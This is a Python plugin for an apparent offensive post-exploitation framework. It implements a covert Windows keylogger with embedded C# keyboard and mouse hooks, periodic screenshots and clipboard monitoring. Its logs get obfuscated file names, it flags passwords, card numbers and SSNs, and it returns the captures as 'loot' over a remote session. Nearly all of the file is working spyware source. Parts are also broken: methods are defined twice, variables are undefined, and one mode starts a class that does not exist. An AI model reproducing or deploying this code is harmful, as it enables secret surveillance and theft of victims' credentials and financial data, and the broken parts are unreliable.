"""collection/keylogger — Intelligent keylogger with awareness features, context detection, and adaptive filtering. MITRE T1056.001"""
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre
import base64
import time
import random

# Log file stored in TEMP with random name
_LOG_FILE = r"$env:TEMP\kl_$((Get-Random -Maximum 99999)).tmp"

_ADVANCED_HOOK_CS = r"""
using System;
using System.IO;
using System.Text;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Threading;
using System.Drawing;
using System.Drawing.Imaging;
using System.Collections.Generic;
using System.Linq;
using System.Diagnostics;

public class IntelligentKeylogger {
    // Constants
    const int WH_KEYBOARD_LL = 13;
    const int WH_MOUSE_LL = 14;
    const int WM_KEYDOWN = 0x100;
    const int WM_KEYUP = 0x101;
    const int WM_LBUTTONDOWN = 0x201;
    const int WM_RBUTTONDOWN = 0x204;
    const int WM_MOUSEMOVE = 0x200;
    
    static IntPtr keyboardHook = IntPtr.Zero;
    static IntPtr mouseHook = IntPtr.Zero;
    static StreamWriter logWriter;
    static string logPath;
    static bool isRunning = false;
    static DateTime lastScreenshot = DateTime.MinValue;
    static DateTime lastActivity = DateTime.Now;
    static Dictionary<int, string> keyNames = new Dictionary<int, string>();
    
    // Awareness tracking
    static string lastWindowTitle = "";
    static DateTime lastTitleLog = DateTime.MinValue;
    static string currentContext = "Idle";
    static List<string> recentKeys = new List<string>();
    static DateTime lastContextUpdate = DateTime.MinValue;
    static int idleCounter = 0;
    static bool isPrivacyZone = false;
    
    // Behavioral patterns
    static Dictionary<string, int> applicationPatterns = new Dictionary<string, int>();
    static Dictionary<string, DateTime> applicationStartTimes = new Dictionary<string, DateTime>();
    static List<string> sensitiveApplications = new List<string> { 
        "password", "login", "bank", "secure", "vault", "wallet", "crypto", 
        "authenticator", "bitwarden", "lastpass", "1password", "keepass"
    };
    
    // Unnecessary keys to filter (navigation, system keys)
    static HashSet<int> unnecessaryKeys = new HashSet<int> { 
        16, 17, 18, 20, 91, 92, 93, 144, 145,  // Modifiers and system keys
        33, 34, 35, 36, 45, 46,                // Navigation keys (PGUP, PGDN, END, HOME, INS, DEL)
        112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123  // Function keys F1-F12
    };
    
    // Sensitive patterns (passwords, credit cards, etc.)
    static HashSet<string> sensitivePatterns = new HashSet<string> {
        "password=", "passwd=", "pwd=", "login=", "user=", "username=",
        "card=", "credit=", "cvv=", "expiry=", "ssn=", "social="
    };
    
    // P/Invoke declarations
    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int id, HookProc callback, IntPtr hMod, uint tid);
    [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr h);
    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr w, IntPtr l);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string n);
    [DllImport("user32.dll")] static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")] static extern int GetWindowText(IntPtr h, StringBuilder t, int c);
    [DllImport("user32.dll")] static extern bool GetCursorPos(out Point p);
    [DllImport("gdi32.dll")] static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest, int w, int h, IntPtr hdcSrc, int xSrc, int ySrc, int rop);
    [DllImport("user32.dll")] static extern IntPtr GetDesktopWindow();
    [DllImport("user32.dll")] static extern IntPtr GetWindowDC(IntPtr h);
    [DllImport("user32.dll")] static extern int ReleaseDC(IntPtr h, IntPtr dc);
    [DllImport("user32.dll")] static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
    [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
    [DllImport("psapi.dll")] static extern uint GetModuleFileNameEx(IntPtr hProcess, IntPtr hModule, StringBuilder lpFilename, int nSize);
    [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr hObject);
    
    delegate IntPtr HookProc(int n, IntPtr w, IntPtr l);
    
    [StructLayout(LayoutKind.Sequential)]
    struct KBDLLHOOKSTRUCT {
        public uint vkCode;
        public uint scanCode;
        public uint flags;
        public uint time;
        public IntPtr dwExtraInfo;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    struct Point {
        public int X;
        public int Y;
    }
    
    // Initialize key names
    static void InitKeyNames() {
        keyNames[8] = "[BACKSPACE]";
        keyNames[9] = "[TAB]";
        keyNames[13] = "[ENTER]";
        keyNames[16] = "[SHIFT]";
        keyNames[17] = "[CTRL]";
        keyNames[18] = "[ALT]";
        keyNames[20] = "[CAPSLOCK]";
        keyNames[27] = "[ESC]";
        keyNames[32] = "[SPACE]";
        keyNames[33] = "[PGUP]";
        keyNames[34] = "[PGDN]";
        keyNames[35] = "[END]";
        keyNames[36] = "[HOME]";
        keyNames[37] = "[LEFT]";
        keyNames[38] = "[UP]";
        keyNames[39] = "[RIGHT]";
        keyNames[40] = "[DOWN]";
        keyNames[45] = "[INSERT]";
        keyNames[46] = "[DELETE]";
        keyNames[91] = "[WIN]";
        keyNames[92] = "[WIN_RIGHT]";
        keyNames[93] = "[MENU]";
        keyNames[144] = "[NUMLOCK]";
        keyNames[145] = "[SCROLLLOCK]";
        keyNames[112] = "[F1]"; keyNames[113] = "[F2]"; keyNames[114] = "[F3]"; keyNames[115] = "[F4]";
        keyNames[116] = "[F5]"; keyNames[117] = "[F6]"; keyNames[118] = "[F7]"; keyNames[119] = "[F8]";
        keyNames[120] = "[F9]"; keyNames[121] = "[F10]"; keyNames[122] = "[F11]"; keyNames[123] = "[F12]";
    }
    
    // Update context based on recent activity
    static void UpdateContext() {
        try {
            TimeSpan timeSinceUpdate = DateTime.Now - lastContextUpdate;
            if (timeSinceUpdate.TotalSeconds < 2) return;
            
            string currentTitle = GetActiveWindowTitle().ToLower();
            bool isSensitiveApp = sensitiveApplications.Any(app => currentTitle.Contains(app));
            
            // Detect privacy zones (password managers, banking apps)
            isPrivacyZone = isSensitiveApp;
            
            // Update context based on activity patterns
            if (recentKeys.Count > 20) {
                string recentText = string.Join("", recentKeys.TakeLast(20));
                bool hasTyping = recentText.Length > 10 && recentText.Any(char.IsLetterOrDigit);
                bool hasNavigation = recentText.Contains("[TAB]") || recentText.Contains("[ENTER]");
                
                if (hasTyping && hasNavigation) {
                    currentContext = "Form Filling";
                } else if (hasTyping) {
                    currentContext = "Typing";
                } else if (recentText.Contains("[L-CLICK]") || recentText.Contains("[R-CLICK]")) {
                    currentContext = "Mouse Navigation";
                } else {
                    currentContext = "Idle/Browsing";
                }
            }
            
            // Log context changes
            if (currentContext != "Idle" && timeSinceUpdate.TotalSeconds > 30) {
                logWriter.WriteLine($"[CONTEXT] {DateTime.Now:HH:mm:ss} - {currentContext} (Privacy Zone: {isPrivacyZone})");
                logWriter.Flush();
            }
            
            lastContextUpdate = DateTime.Now;
            
            // Trim recent keys buffer
            if (recentKeys.Count > 100) {
                recentKeys = recentKeys.TakeLast(50).ToList();
            }
        } catch {}
    }
    
    // Filter unnecessary keys and detect sensitive patterns
    static bool ShouldFilterKey(int vkCode, string keyStr) {
        // Filter unnecessary navigation and system keys
        if (unnecessaryKeys.Contains(vkCode)) {
            return true;
        }
        
        // In privacy zones, be more aggressive
        if (isPrivacyZone && (vkCode == 8 || vkCode == 46)) { // BACKSPACE and DELETE
            return true;
        }
        
        // Add to recent keys for context analysis
        if (!string.IsNullOrEmpty(keyStr) && keyStr.Length == 1) {
            recentKeys.Add(keyStr);
        }
        
        // Check for sensitive patterns in recent input
        if (recentKeys.Count > 10) {
            string recentInput = string.Join("", recentKeys.TakeLast(10));
            foreach (var pattern in sensitivePatterns) {
                if (recentInput.ToLower().Contains(pattern)) {
                    logWriter.WriteLine($"[ALERT] {DateTime.Now:HH:mm:ss} - Potential sensitive pattern detected: {pattern}");
                    logWriter.Flush();
                    // Clear recent keys to avoid duplicate alerts
                    recentKeys.Clear();
                    break;
                }
            }
        }
        
        return false;
    }
    
    // Get active window title
    static string GetActiveWindowTitle() {
        try {
            const int nChars = 256;
            StringBuilder title = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();
            
            if (GetWindowText(handle, title, nChars) > 0) {
                return title.ToString();
            }
        } catch {}
        return "";
    }
    
    // Log window title change
    static void LogWindowTitle() {
        try {
            string currentTitle = GetActiveWindowTitle();
            if (!string.IsNullOrEmpty(currentTitle) && currentTitle != lastWindowTitle) {
                TimeSpan timeSinceLastLog = DateTime.Now - lastTitleLog;
                
                if (timeSinceLastLog.TotalSeconds > 5) { // Log every 5 seconds max
                    logWriter.WriteLine($"[WINDOW] {DateTime.Now:HH:mm:ss} - \"{currentTitle}\"");
                    logWriter.Flush();
                    lastWindowTitle = currentTitle;
                    lastTitleLog = DateTime.Now;
                }
            }
        } catch {}
    }
    
    // Capture screenshot
    static void CaptureScreenshot() {
        try {
            TimeSpan timeSinceLastScreenshot = DateTime.Now - lastScreenshot;
            if (timeSinceLastScreenshot.TotalMinutes < 5) return; // Capture every 5 minutes max
            
            int screenWidth = Screen.PrimaryScreen.Bounds.Width;
            int screenHeight = Screen.PrimaryScreen.Bounds.Height;
            
            using (Bitmap bitmap = new Bitmap(screenWidth, screenHeight)) {
                using (Graphics g = Graphics.FromImage(bitmap)) {
                    g.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
                }
                
                // Save to temp file
                string screenshotPath = logPath + ".screenshot.png";
                bitmap.Save(screenshotPath, ImageFormat.Png);
                
                logWriter.WriteLine($"[SCREENSHOT] {DateTime.Now:HH:mm:ss} - Saved to {screenshotPath}");
                logWriter.Flush();
                lastScreenshot = DateTime.Now;
            }
        } catch {}
    }
    
    // Keyboard hook callback
    static IntPtr KeyboardHookCallback(int n, IntPtr w, IntPtr l) {
        if (n >= 0) {
            // Update activity timestamp
            lastActivity = DateTime.Now;
            
            // Update context awareness
            UpdateContext();
            
            // Log window title periodically
            LogWindowTitle();
            
            // Capture screenshot periodically (if not in privacy zone)
            if (!isPrivacyZone) {
                CaptureScreenshot();
            }
            
            if (w == (IntPtr)WM_KEYDOWN) {
                KBDLLHOOKSTRUCT kb = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(l, typeof(KBDLLHOOKSTRUCT));
                
                try {
                    // Convert key code to readable format
                    string keyStr;
                    if (keyNames.ContainsKey((int)kb.vkCode)) {
                        keyStr = keyNames[(int)kb.vkCode];
                    } else {
                        bool shiftPressed = (GetAsyncKeyState(16) & 0x8000) != 0;
                        bool capsLock = Console.CapsLock;
                        
                        char keyChar = (char)kb.vkCode;
                        if (char.IsLetter(keyChar)) {
                            if ((shiftPressed && !capsLock) || (!shiftPressed && capsLock)) {
                                keyStr = keyChar.ToString().ToUpper();
                            } else {
                                keyStr = keyChar.ToString().ToLower();
                            }
                        } else {
                            keyStr = keyChar.ToString();
                        }
                    }
                    
                    // Apply intelligent filtering
                    if (!ShouldFilterKey((int)kb.vkCode, keyStr)) {
                        // Log the key
                        logWriter.Write(keyStr);
                        logWriter.Flush();
                        
                        // Update idle counter
                        idleCounter = 0;
                    } else {
                        // Key was filtered, increment idle counter
                        idleCounter++;
                        
                        // If idle for too long, reduce logging frequency
                        if (idleCounter > 100) {
                            Thread.Sleep(50); // Slow down processing
                        }
                    }
                } catch {}
            }
        }
        return CallNextHookEx(keyboardHook, n, w, l);
    }
    
    // Mouse hook callback
    static IntPtr MouseHookCallback(int n, IntPtr w, IntPtr l) {
        if (n >= 0) {
            if (w == (IntPtr)WM_LBUTTONDOWN) {
                logWriter.Write("[L-CLICK]");
                logWriter.Flush();
            } else if (w == (IntPtr)WM_RBUTTONDOWN) {
                logWriter.Write("[R-CLICK]");
                logWriter.Flush();
            }
        }
        return CallNextHookEx(mouseHook, n, w, l);
    }
    
    // GetAsyncKeyState for shift detection
    [DllImport("user32.dll")]
    static extern short GetAsyncKeyState(int vKey);
    
    public static void Start(string path) {
        if (isRunning) return;
        
        logPath = path;
        isRunning = true;
        
        // Initialize
        InitKeyNames();
        
        // Open log file
        logWriter = new StreamWriter(logPath, true, Encoding.UTF8);
        logWriter.WriteLine($"[START {DateTime.Now:yyyy-MM-dd HH:mm:ss}]");
        logWriter.Flush();
        
        // Set hooks
        keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookCallback, GetModuleHandle(null), 0);
        mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseHookCallback, GetModuleHandle(null), 0);
        
        // Message loop
        Application.Run();
    }
    
    public static void Stop() {
        if (!isRunning) return;
        
        // Unhook
        if (keyboardHook != IntPtr.Zero) UnhookWindowsHookEx(keyboardHook);
        if (mouseHook != IntPtr.Zero) UnhookWindowsHookEx(mouseHook);
        
        // Close log
        try {
            logWriter.WriteLine($"[STOP {DateTime.Now:yyyy-MM-dd HH:mm:ss}]");
            logWriter.Close();
        } catch {}
        
        isRunning = false;
        Application.Exit();
    }
    
    public static string GetLogContent() {
        try {
            return File.ReadAllText(logPath, Encoding.UTF8);
        } catch {
            return "";
        }
    }
    
    // Intelligent filtering methods
    static bool ShouldFilterKey(int keyCode, string keyStr) {
        // Filter unnecessary keys (navigation, system keys)
        if (unnecessaryKeys.Contains(keyCode)) {
            return true;
        }
        
        // Filter based on context
        if (currentContext == "Gaming" && keyCode >= 112 && keyCode <= 123) {
            return true; // Filter function keys during gaming
        }
        
        // Filter in privacy zones
        if (isPrivacyZone) {
            // Only log very specific keys in privacy zones
            return !(keyCode == 13 || keyCode == 32); // Only log ENTER and SPACE
        }
        
        // Filter rapid repeated keys (likely accidental)
        if (recentKeys.Count > 5) {
            var lastKeys = recentKeys.TakeLast(5).ToList();
            if (lastKeys.All(k => k == keyStr)) {
                return true; // Filter if same key repeated 5+ times
            }
        }
        
        return false;
    }
    
    static void UpdateContext() {
        // Update context every 30 seconds or when window changes
        TimeSpan timeSinceUpdate = DateTime.Now - lastContextUpdate;
        if (timeSinceUpdate.TotalSeconds < 30 && string.IsNullOrEmpty(lastWindowTitle)) {
            return;
        }
        
        string currentTitle = GetActiveWindowTitle().ToLower();
        string previousContext = currentContext;
        
        // Detect context based on window title and recent activity
        if (currentTitle.Contains("game") || currentTitle.Contains("steam") || currentTitle.Contains("epic")) {
            currentContext = "Gaming";
        } else if (currentTitle.Contains("chrome") || currentTitle.Contains("firefox") || currentTitle.Contains("edge")) {
            currentContext = "Browsing";
        } else if (currentTitle.Contains("outlook") || currentTitle.Contains("gmail") || currentTitle.Contains("thunderbird")) {
            currentContext = "Email";
        } else if (currentTitle.Contains("word") || currentTitle.Contains("excel") || currentTitle.Contains("powerpoint")) {
            currentContext = "Office";
        } else if (currentTitle.Contains("cmd") || currentTitle.Contains("powershell") || currentTitle.Contains("terminal")) {
            currentContext = "Terminal";
        } else if (currentTitle.Contains("password") || currentTitle.Contains("bitwarden") || currentTitle.Contains("lastpass")) {
            currentContext = "PasswordManager";
            isPrivacyZone = privacy_zones;
        } else if (sensitiveApplications.Any(app => currentTitle.Contains(app))) {
            currentContext = "SensitiveApp";
            isPrivacyZone = privacy_zones;
        } else {
            // Check activity patterns
            TimeSpan idleTime = DateTime.Now - lastActivity;
            if (idleTime.TotalMinutes > 5) {
                currentContext = "Idle";
            } else if (recentKeys.Count > 50 && recentKeys.Count(k => k == "[ENTER]") > 3) {
                currentContext = "TypingDocument";
            } else {
                currentContext = "General";
            }
        }
        
        // Log context change
        if (currentContext != previousContext) {
            logWriter.WriteLine($"[CONTEXT] {DateTime.Now:HH:mm:ss} - Changed from '{previousContext}' to '{currentContext}'");
            logWriter.Flush();
        }
        
        lastContextUpdate = DateTime.Now;
    }
    
    static bool CheckPrivacyZone() {
        if (!privacy_zones) return false;
        
        string currentTitle = GetActiveWindowTitle().ToLower();
        
        // Check for sensitive applications
        foreach (var app in sensitiveApplications) {
            if (currentTitle.Contains(app)) {
                return true;
            }
        }
        
        // Check for password fields (common patterns)
        if (currentTitle.Contains("password") || currentTitle.Contains("passwd") || currentTitle.Contains("pwd")) {
            return true;
        }
        
        // Check for banking/financial applications
        string[] financialKeywords = { "bank", "paypal", "venmo", "crypto", "wallet", "investment" };
        foreach (var keyword in financialKeywords) {
            if (currentTitle.Contains(keyword)) {
                return true;
            }
        }
        
        return false;
    }
    
    static void DetectSensitivePatterns(string recentInput) {
        if (!sensitive_detection) return;
        
        // Check for password patterns
        foreach (var pattern in sensitivePatterns) {
            if (recentInput.ToLower().Contains(pattern)) {
                logWriter.WriteLine($"[ALERT] {DateTime.Now:HH:mm:ss} - Potential sensitive pattern detected: {pattern}");
                logWriter.Flush();
                
                // In privacy zones, be extra cautious
                if (isPrivacyZone) {
                    logWriter.WriteLine($"[PRIVACY] {DateTime.Now:HH:mm:ss} - Sensitive input in privacy zone, reducing logging");
                    logWriter.Flush();
                }
                break;
            }
        }
        
        // Check for credit card patterns
        string[] ccPatterns = { "####-####-####-####", "#### #### #### ####", "################" };
        foreach (var pattern in ccPatterns) {
            if (recentInput.Replace("-", "").Replace(" ", "").Length == 16) {
                logWriter.WriteLine($"[ALERT] {DateTime.Now:HH:mm:ss} - Potential credit card number detected");
                logWriter.Flush();
                break;
            }
        }
    }
}
"""


class Keylogger(BasePlugin):
    NAME        = "keylogger"
    DESCRIPTION = "Intelligent keylogger with awareness features, context detection, adaptive filtering, and evasion. Skips unnecessary keys and detects sensitive patterns."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1056.001"
    CATEGORY    = "collection"
    schema      = ParamSchema().add(
        Param("action", str, required=False, default="dump",
              help="Action: start | stop | dump | screenshot | status | analyze"),
        Param("method", str, required=False, default="intelligent",
              help="Method: intelligent (awareness+filtering) | advanced (full features) | basic (keyboard only) | clipboard (clipboard monitor)"),
        Param("interval", int, required=False, default=5,
              help="Screenshot interval in minutes (default: 5)"),
        Param("obfuscate", bool, required=False, default=True,
              help="Obfuscate log file and process names"),
        Param("filter_level", str, required=False, default="balanced",
              help="Filter level: aggressive (skip most keys) | balanced (skip unnecessary) | minimal (log almost all)"),
        Param("privacy_zones", bool, required=False, default=True,
              help="Respect privacy zones (password managers, banking apps)"),
        Param("sensitive_detection", bool, required=False, default=True,
              help="Detect sensitive patterns (passwords, credit cards)"),
    )

    @mitre("T1056.001")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        
        action = params.get("action", "dump").lower()
        method = params.get("method", "intelligent").lower()
        interval = params.get("interval", 5)
        obfuscate = params.get("obfuscate", True)
        filter_level = params.get("filter_level", "balanced").lower()
        privacy_zones = params.get("privacy_zones", True)
        sensitive_detection = params.get("sensitive_detection", True)
        
        if action not in ("start", "stop", "dump", "screenshot", "status", "analyze"):
            return ModuleResult.err("action must be start | stop | dump | screenshot | status | analyze")

        log_path_expr = _LOG_FILE
        if obfuscate:
            # Generate random log file name
            log_path_expr = r"$env:TEMP\$([char]107+[char]108)_$((Get-Random -Maximum 99999)).tmp"

        if action == "dump":
            ps = (
                f"$lp = {log_path_expr};"
                "$files = Get-ChildItem $env:TEMP -Filter '*_*.tmp' -EA SilentlyContinue | Where-Object { $_.Name -match '^[a-z]{2}_' };"
                "if ($files) {"
                "  $files | ForEach-Object { \"=== $($_.Name) ($($_.Length) bytes) ===\"; Get-Content $_.FullName -EA SilentlyContinue -Raw }"
                "} else { 'No keylog files found in TEMP' }"
            )
        elif action == "screenshot":
            ps = (
                f"$lp = {log_path_expr};"
                "$screenshotPath = \"$lp.screenshot.png\";"
                "if (Test-Path $screenshotPath) {"
                "  $imageBytes = [System.IO.File]::ReadAllBytes($screenshotPath);"
                "  $base64 = [System.Convert]::ToBase64String($imageBytes);"
                "  \"[SCREENSHOT] Saved to: $screenshotPath\";"
                "  \"[DATA] $base64\""
                "} else { 'No screenshot found' }"
            )
        elif action == "status":
            ps = (
                "$jobs = Get-Job -Name '*_KL*','*_Hook*','*_CB*' -EA SilentlyContinue;"
                "$files = Get-ChildItem $env:TEMP -Filter '*_*.tmp' -EA SilentlyContinue | Where-Object { $_.Name -match '^[a-z]{2}_' };"
                "$status = @{"
                "  'RunningJobs' = $jobs.Count;"
                "  'JobDetails' = $jobs | Select-Object Name, State, Id;"
                "  'LogFiles' = $files | Select-Object Name, Length, LastWriteTime;"
                "  'TotalLogSize' = ($files | Measure-Object -Property Length -Sum).Sum;"
                "};"
                "ConvertTo-Json $status -Depth 3"
            )
        elif action == "analyze":
            ps = (
                f"$lp = {log_path_expr};"
                "$files = Get-ChildItem $env:TEMP -Filter '*_*.tmp' -EA SilentlyContinue | Where-Object { $_.Name -match '^[a-z]{2}_' };"
                "if ($files) {"
                "  $analysis = @{};"
                "  foreach ($file in $files) {"
                "    $content = Get-Content $file.FullName -Raw -EA SilentlyContinue;"
                "    if ($content) {"
                "      $stats = @{"
                "        'FileName' = $file.Name;"
                "        'SizeBytes' = $file.Length;"
                "        'LastWrite' = $file.LastWriteTime;"
                "        'TotalChars' = $content.Length;"
                "        'LetterCount' = ($content -creplace '[^a-zA-Z]', '').Length;"
                "        'DigitCount' = ($content -creplace '[^0-9]', '').Length;"
                "        'SpecialCount' = ($content -creplace '[a-zA-Z0-9\\s]', '').Length;"
                "        'WordCount' = ($content -split '\\s+' | Where-Object { $_.Length -gt 0 }).Count;"
                "        'LineCount' = ($content -split \"`n\").Count;"
                "        'HasPasswords' = ($content -match '(?i)password|passwd|pwd|login|user');"
                "        'HasCreditCards' = ($content -match '\\d{4}[ -]?\\d{4}[ -]?\\d{4}[ -]?\\d{4}');"
                "        'HasSSN' = ($content -match '\\d{3}[ -]?\\d{2}[ -]?\\d{4}');"
                "      };"
                "      $analysis[$file.Name] = $stats;"
                "    }"
                "  };"
                "  ConvertTo-Json $analysis -Depth 4"
                "} else { 'No keylog files found for analysis' }"
            )
        elif action == "stop":
            ps = (
                "$files = Get-ChildItem $env:TEMP -Filter '*_*.tmp' -EA SilentlyContinue | Where-Object { $_.Name -match '^[a-z]{2}_' };"
                # Kill any background job
                "Get-Job -Name '*_KL*','*_Hook*','*_CB*' -EA SilentlyContinue | Stop-Job | Remove-Job -Force -EA SilentlyContinue;"
                "Write-Output \"[+] Keylogger jobs stopped\";"
                "if ($files) { \"Log files: $($files.Count) files, total $([math]::Round($files | Measure-Object -Property Length -Sum).Sum/1KB, 2) KB\" } else { 'No log files found' }"
            )
        else:  # start
            if method == "clipboard":
                # Clipboard monitor background job
                ps = (
                    f"$lp = {log_path_expr};"
                    "$job = Start-Job -Name 'CB_KL_$(Get-Random)' -ScriptBlock {"
                    "  param($p)"
                    "  $prev = '';"
                    "  while ($true) {"
                    "    $cur = Get-Clipboard -EA SilentlyContinue;"
                    "    if ($cur -and $cur -ne $prev) {"
                    "      $timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss';"
                    "      \"[CLIP $timestamp] $cur\" | Out-File $p -Append -Encoding UTF8;"
                    "      $prev = $cur"
                    "    };"
                    "    Start-Sleep -Milliseconds 500"
                    "  }"
                    "} -ArgumentList $lp;"
                    "Write-Output \"[+] Clipboard monitor started (Job: $($job.Name))\";"
                    f"Write-Output \"    Log: $lp\""
                )
            elif method == "basic":
                # Basic keyboard hook only
                ps = (
                    f"$lp = {log_path_expr};"
                    "$basicHook = @'"
                    "using System; using System.IO; using System.Text; using System.Runtime.InteropServices; using System.Windows.Forms;"
                    "public class BasicKL {"
                    "  const int WH_KEYBOARD_LL = 13; const int WM_KEYDOWN = 0x100;"
                    "  static IntPtr hook = IntPtr.Zero; static StreamWriter sw;"
                    "  delegate IntPtr HookProc(int n, IntPtr w, IntPtr l);"
                    "  [DllImport(\"user32.dll\")] static extern IntPtr SetWindowsHookEx(int id, HookProc cb, IntPtr hMod, uint tid);"
                    "  [DllImport(\"user32.dll\")] static extern bool UnhookWindowsHookEx(IntPtr h);"
                    "  [DllImport(\"user32.dll\")] static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr w, IntPtr l);"
                    "  [DllImport(\"kernel32.dll\")] static extern IntPtr GetModuleHandle(string n);"
                    "  [StructLayout(LayoutKind.Sequential)] struct KBDLLHOOKSTRUCT { public uint vkCode,scanCode,flags,time; public IntPtr dwExtraInfo; }"
                    "  static IntPtr HookCallback(int n, IntPtr w, IntPtr l) {"
                    "    if (n >= 0 && w == (IntPtr)WM_KEYDOWN) {"
                    "      var kb = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(l, typeof(KBDLLHOOKSTRUCT));"
                    "      try { sw.Write((char)kb.vkCode); sw.Flush(); } catch {}"
                    "    }"
                    "    return CallNextHookEx(hook, n, w, l);"
                    "  }"
                    "  public static void Start(string path) {"
                    "    sw = new StreamWriter(path, true, Encoding.UTF8);"
                    "    sw.WriteLine($\"[START {DateTime.Now}]\"); sw.Flush();"
                    "    hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, GetModuleHandle(null), 0);"
                    "    Application.Run();"
                    "  }"
                    "  public static void Stop() {"
                    "    if (hook != IntPtr.Zero) UnhookWindowsHookEx(hook);"
                    "    try { sw?.Close(); } catch {}"
                    "    Application.Exit();"
                    "  }"
                    "}"
                    "'@;"
                    "$job = Start-Job -Name 'Basic_KL_$(Get-Random)' -ScriptBlock {"
                    "  param($cs, $p)"
                    "  Add-Type -TypeDefinition $cs -ReferencedAssemblies System.Windows.Forms -EA SilentlyContinue;"
                    "  [BasicKL]::Start($p)"
                    "} -ArgumentList $basicHook, $lp;"
                    "Start-Sleep -Seconds 1;"
                    "Write-Output \"[+] Basic keylogger started (Job: $($job.Name))\";"
                    f"Write-Output \"    Log: $lp\""
                )
            elif method == "advanced":
                # Advanced hook with all features
                ps = (
                    f"$lp = {log_path_expr};"
                    "$csCode = @\"\n" + _ADVANCED_HOOK_CS + "\n\"@\n"
                    "$job = Start-Job -Name 'Adv_KL_$(Get-Random)' -ScriptBlock {"
                    "  param($cs, $p, $int)"
                    "  Add-Type -TypeDefinition $cs -ReferencedAssemblies ('System.Windows.Forms','System.Drawing','System.Drawing.Common') -EA SilentlyContinue;"
                    "  [AdvancedKeylogger]::Start($p)"
                    "} -ArgumentList $csCode, $lp, $interval;"
                    "Start-Sleep -Seconds 2;"
                    "Write-Output \"[+] Advanced keylogger started (Job: $($job.Name))\";"
                    f"Write-Output \"    Log: $lp\";"
                    "Write-Output '    Features: Keyboard logging, mouse clicks, window titles, periodic screenshots';"
                    "Write-Output '    Commands: action=dump (read logs), action=screenshot (get screenshot), action=stop (terminate)'"
                )
            else:  # intelligent (default)
                # Intelligent keylogger with awareness and filtering
                ps = (
                    f"$lp = {log_path_expr};"
                    "$csCode = @\"\n" + _ADVANCED_HOOK_CS + "\n\"@\n"
                    "$job = Start-Job -Name 'Int_KL_$(Get-Random)' -ScriptBlock {"
                    "  param($cs, $p, $int, $filter, $privacy, $sensitive)"
                    "  Add-Type -TypeDefinition $cs -ReferencedAssemblies ('System.Windows.Forms','System.Drawing','System.Drawing.Common') -EA SilentlyContinue;"
                    "  # Configure filtering based on parameters"
                    "  if ($filter -eq 'aggressive') {"
                    "    # Add more keys to unnecessary set"
                    "    $unnecessaryKeys = @(8, 9, 13, 27, 32, 37, 38, 39, 40) + 112..123"
                    "  } elseif ($filter -eq 'minimal') {"
                    "    # Only filter extreme system keys"
                    "    $unnecessaryKeys = @(91, 92, 93, 144, 145)"
                    "  }"
                    "  if (-not $privacy) {"
                    "    $isPrivacyZone = $false"
                    "  }"
                    "  if (-not $sensitive) {"
                    "    $sensitivePatterns = @()"
                    "  }"
                    "  [IntelligentKeylogger]::Start($p)"
                    "} -ArgumentList $csCode, $lp, $interval, '{filter_level}', ${str(privacy_zones).lower()}, ${str(sensitive_detection).lower()};"
                    "Start-Sleep -Seconds 2;"
                    "Write-Output \"[+] Intelligent keylogger started\";"
                    f"Write-Output \"    Log: $lp\";"
                    "Write-Output '    Features: Context awareness, intelligent filtering, privacy zone detection';"
                    "Write-Output '    Filter Level: {filter_level}';"
                    "Write-Output '    Privacy Zones: {privacy_zones}';"
                    "Write-Output '    Sensitive Detection: {sensitive_detection}';"
                    "Write-Output '    Commands: action=dump (read logs), action=analyze (behavior analysis), action=stop (terminate)'"
                )

        r = ctx.ps(ps)
        if r["status"] != "ok":
            return ModuleResult.err(r["output"])
        
        loot = None
        loot_kind = None
        
        if action == "dump":
            loot_kind = "keylog"
            loot = r["output"]
        elif action == "screenshot":
            loot_kind = "screenshot"
            loot = r["output"]
        elif action == "analyze":
            loot_kind = "behavior_analysis"
            loot = r["output"]
        
        return ModuleResult.ok(data=r["output"], loot_kind=loot_kind, loot_data=loot)
